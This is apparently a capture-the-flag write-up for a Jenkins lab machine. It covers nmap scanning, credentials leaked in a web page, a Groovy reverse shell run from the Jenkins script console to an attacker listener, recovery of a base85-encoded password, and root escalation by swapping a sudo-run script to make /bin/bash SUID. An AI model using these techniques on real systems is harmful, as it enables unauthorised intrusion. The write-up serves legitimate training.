# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1018ms
rtt min/avg/max/mdev = 0.036/0.042/0.048/0.006 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 12:51 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 22:09:2B:EE:57:71 (Unknown)
```
``` bash
sudo nmap -p80,443,8080 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 12:51 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Hacker Nexus - jenkhack.hl
|_http-server-header: Apache/2.4.58 (Ubuntu)
443/tcp  open  ssl/http Jetty 10.0.13
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.13)
| tls-alpn:
|_  http/1.1
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2024-09-01T12:00:45
|_Not valid after:  2025-09-01T12:00:45
8080/tcp open  http     Jetty 10.0.13
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.13)
MAC Address: 22:09:2B:EE:57:71 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```
# Web enumeration
## Port 80
``` bash
curl -s http://172.17.0.2
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Nexus - jenkhack.hl</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <div class="container">
            <h1>Welcome to the <span class="highlight">Hacker Nexus</span></h1>
            <p>Your gateway to a new realm of technology and security.</p>
        </div>
    </header>

    <main>
        <section class="hero">
            <div class="hero-content">
                <h2>Unleash the Power of Cyber Intelligence</h2>
                <p>Discover tools, insights, and strategies to enhance your digital security.</p>
                <br>
                <a href="#services" class="btn-primary">Explore Now</a>
            </div>
        </section>

        <section class="services" id="services">
            <h2>Our Services</h2>
            <div class="service-grid">
                <div class="service-item">
                    <img src="https://miro.medium.com/v2/resize:fit:1400/0*_n2AQxhJSwAlIMke" alt="jenkins-admin">
                    <h3>Advanced <span class="highlight">Admin Tools</span></h3>
                    <p>Manage your systems efficiently with our comprehensive tools.</p>
                    <p><em>Explore how <span class="hidden">jenkins-admin</span> can optimize your workflows.</em></p>
                </div>
                <div class="service-item">
                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9QsnEbRf5NU51IyoPD3LSok3q4d_25auKA&s" alt="cassandra">
                    <h3>Database Management</h3>
                    <p>Secure and manage your databases with cutting-edge solutions.</p>
                    <p><em>Learn more about <span class="hidden">cassandra</span> for advanced data management.</em></p>
                </div>
                <div class="service-item">
                    <img src="https://pbs.twimg.com/profile_images/1707408286981472256/ATqgURB5_400x400.jpg" alt="Hacking Tools">
                    <h3>Exclusive <span class="highlight">Hacking Tools</span></h3>
                    <p>Access a suite of tools designed for professionals and enthusiasts alike.</p>
                    <p><em>Visit <span class="hidden">jenkhack.hl</span> for unique insights and tools.</em></p>
                </div>
            </div>
        </section>

        <section class="features">
            <h2>Key Features</h2>
            <div class="feature-item">
                <h3>Real-Time Monitoring</h3>
                <p>Track and monitor your systems with real-time updates and alerts.</p>
            </div>
            <div class="feature-item">
                <h3>Advanced Analytics</h3>
                <p>Utilize advanced analytics to gain deep insights and make informed decisions.</p>
            </div>
            <div class="feature-item">
                <h3>Custom Solutions</h3>
                <p>Get tailored solutions to meet your specific security needs.</p>
            </div>
        </section>

        <section class="contact">
            <h2>Contact Us</h2>
            <p>For more information, reach out to us at <a href="mailto:contact@jenkhack.hl">contact@jenkhack.hl</a></p>
        </section>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2024 Hacker Nexus. All Rights Reserved.</p>
        </div>
    </footer>

    <script src="scripts.js"></script>
</body>
</html>
```
Three interesting lines
1. <img src="https://miro.medium.com/v2/resize:fit:1400/0*_n2AQxhJSwAlIMke" alt="jenkins-admin">
2. <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9QsnEbRf5NU51IyoPD3LSok3q4d_25auKA&s" alt="cassandra">
3. <p>For more information, reach out to us at <a href="mailto:contact@jenkhack.hl">contact@jenkhack.hl</a></p>
Let's add jenkhack.hl to the hosts configuration
``` bash
cat /etc/hosts | grep jenkhack
172.17.0.2      jenkhack.hl
```
## Port 8080
It is a login panel to Jenkins admin panel
Using the credentials *jenkins-admin:cassandra* i successfully login
# Reverse shell
Using the *script console* in the Jenkins admin panel i can execute a reverse shell
``` groovy
String host="172.17.0.1";
int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
``` bash
sudo nc -lvnp 443
whoami
jenkins
```
# Privilege escalation
``` bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
jenkins:x:101:103:Jenkins,,,:/var/lib/jenkins:/bin/bash
jenkhack:x:1001:1001:jenkhack,,,:/home/jenkhack:/bin/bash
```
## Lateral movement: jenkins -> jenkhack
``` bash
find / -regex .*jenkhack.* 2>/dev/null
/home/jenkhack
/var/www/jenkhack
/var/www/jenkhack/note.txt
cat /var/www/jenkhack/note.txt
jenkhack:C1V9uBl8!'Ci*`uDfP
```
The password is stored in base85
``` bash
python3 -c "import base64; print(base64.a85decode(b\"C1V9uBl8!'Ci*\`uDfP\").decode('utf-8'))"
jenkinselmejor
```
``` bash
su jenkhack
```
# User flag
``` bash
cat user.txt
3635ccd7044e99813883c8a1b95ced04
```
## Lateral movement: jenkhack -> root
``` bash
jenkhack@45f8956a3893:~$ sudo -l
(ALL : ALL) NOPASSWD: /usr/local/bin/bash
sudo -u root /usr/local/bin/bash -p
Welcome to the bash application!
Running command...
This is the bash script running.
```
Since jenkhack has perm on /opt i can remove the script /usr/local/bin/bash is calling and replace it
``` bash
ls -l /opt
-rwxr-xr-x 1 root root 75 Sep  1  2024 bash.sh
mv /opt/bash.sh /opt/bash.sh.bak
cat > /opt/bash.sh << EOF
> #!/bin/bash
> chmod 4755 /bin/bash
> EOF
chmod +x /opt/bash.sh
```
``` bash
sudo -u root /usr/local/bin/bash
Welcome to the bash application!
Running command...
/bin/bash -p
whoami
root
```
# Root flag
``` bash
cat /root/root.txt
c43cb8e62105280785c7500ba705a9fc
```
